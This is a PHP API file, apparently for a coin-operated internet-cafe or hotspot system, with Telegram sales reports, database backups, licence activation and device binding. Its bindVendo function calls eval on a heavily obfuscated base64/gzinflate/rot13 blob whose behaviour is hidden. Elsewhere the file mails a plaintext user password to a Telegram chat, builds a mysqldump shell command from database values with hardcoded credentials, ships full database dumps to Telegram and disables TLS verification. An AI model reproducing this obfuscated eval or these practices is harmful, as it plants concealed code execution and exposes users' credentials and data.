<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
require_once("../model/model.php");

class API extends MODEL
{
	function getsales()
	{
		$data = array();
		$today_sales = $this->sqlquery("SELECT ifnull(SUM(credit),0) as today_sales from `insert_logs` where date(date_inserted) = date(now())");
		$monthly_sale = $this->sqlquery("SELECT MONTH(date_inserted) AS month, YEAR(date_inserted) AS year, ifnull(SUM(credit),0) AS monthly_sale
		FROM insert_logs
		GROUP BY year, month
		ORDER BY year desc, month DESC limit  1");
		$yearly_sale = $this->sqlquery("SELECT YEAR(date_inserted) AS year, ifnull(SUM(credit),0) AS yearly_sale
		FROM insert_logs
		GROUP BY year
		ORDER BY year desc limit 1");

		$today_sales  = $today_sales[0]['today_sales'] ?? 0;
		$monthly_sale = $monthly_sale[0]['monthly_sale'] ?? 0;
		$yearly_sale  = $yearly_sale[0]['yearly_sale'] ?? 0;

		$msg  = "Today Sales   : " . $today_sales . "\n";
		$msg .= "Monthly Sales : " . $monthly_sale . "\n";
		$msg .= "Yearly Sales  : " . $yearly_sale . "\n";
		$this->sendTelegram("💰💰💰Total Sales💰💰💰", $msg);
	}

	function forgotPassword()
	{
		$result = $this->sqlquery("Select `password` from `users`");
		$pass = $result[0]['password'];
		$msg = "Your Password is : " . $pass;
		$this->sendTelegram("Forgot Password", $msg);
	}

	function sendTelegram($title, $msg)
	{
		$result = $this->sqlquery("SELECT bot_token, chat_id FROM telegram");
		$bot_token = $result[0]['bot_token'];
		$chat_id   = $result[0]['chat_id'];

		$url = "https://api.telegram.org/bot$bot_token/sendMessage";

		$curl = curl_init();
		curl_setopt($curl, CURLOPT_URL, $url);
		curl_setopt($curl, CURLOPT_POST, true);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

		$headers = array(
			"Content-Type: application/json",
		);
		curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

		$data = json_encode([
			"chat_id" => $chat_id,
			"text" => $title . "\n\n" . $msg,
			"parse_mode" => "Markdown"
		]);

		curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

		// For debugging only
		curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
		curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

		$resp = curl_exec($curl);
		curl_close($curl);

		var_dump($resp);
	}


	function autobackup($param)
	{
		$list = $this->sqlquery("SELECT `list` FROM `backup_items`");

		if ($list) {
			$items = $list[0]['list'];
			$itemsArray = explode("|", $items);
			$fomatParam = str_replace("|", " ", $items);

			$truncate = "";
			foreach ($itemsArray as $item) {
				$truncate .= "TRUNCATE TABLE " . $item . ";\n";
			}

			$timestamp = date('Y-m-d_H-i-s');
			$backupFile = "/tmp/backup$timestamp.sql";

			// Write TRUNCATE statement first
			file_put_contents($backupFile, $truncate);

			// Append mysqldump output (INSERT statements)
			$command = "mysqldump -u ftech -pftech --no-create-info --skip-triggers --complete-insert ftech $fomatParam >> $backupFile";
			exec($command, $output, $returnVar);

			if ($returnVar !== 0) {
				echo "❌ Error creating backup: " . implode("\n", $output);
				return;
			}

			// Ensure backup file exists
			if (!file_exists($backupFile)) {
				echo "❌ Backup file was not created!";
				return;
			}

			// Fetch Telegram API credentials
			$result = $this->sqlquery("SELECT bot_token, chat_id FROM telegram");

			if (!isset($result[0]['bot_token']) || !isset($result[0]['chat_id'])) {
				echo "❌ Telegram bot credentials not found!";
				return;
			}

			$botToken = $result[0]['bot_token'];
			$chatId = $result[0]['chat_id'];

			if (!$botToken || !$chatId) {
				echo "❌ Invalid bot token or chat ID!";
				return;
			}

			// Send the backup file via Telegram API
			$telegramApiUrl = "https://api.telegram.org/bot$botToken/sendDocument";
			$postFields = [
				'chat_id' => $chatId,
				'document' => new CURLFile($backupFile),
				'caption' => "📂 Database Backup - $timestamp"
			];

			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $telegramApiUrl);
			curl_setopt($ch, CURLOPT_POST, true);
			curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

			$response = curl_exec($ch);
			$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
			curl_close($ch);

			// Remove the backup file after sending
			unlink($backupFile);

			if ($httpCode == 200) {
				echo "✅ Backup sent to Telegram successfully!";
			} else {
				echo "❌ Failed to send backup to Telegram. Response: " . $response;
			}
		}
	}

	function activate_licensed($licenseKey, $machineId)
	{
		$sql = "INSERT INTO license (license_key, machine_id, isActive) VALUES (?,?,?)";
		$result = $this->sqlnonquery($sql, [$licenseKey, $machineId, 1]);
		if ($result) {
			return json_encode([
				'status' => 'success',
				'msg' => 'License activated successfully.'
			]);
		}

		return json_encode([
			'status' => 'error',
			'msg' => 'Failed to activate license'
		]);
	}

	function clear_guest_time()
	{
		$result = $this->sqlnonquery("Update clientpc set remaining_time = 0 where remaining_time > 0");
		return $result;
	}

	function bindVendo($coinslot_name, $coinslot_description, $ip, $mac, $subnet, $gateway, $dns, $link, $duplex)
	{
		eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));
		return json_encode($arrdata);
	}
}
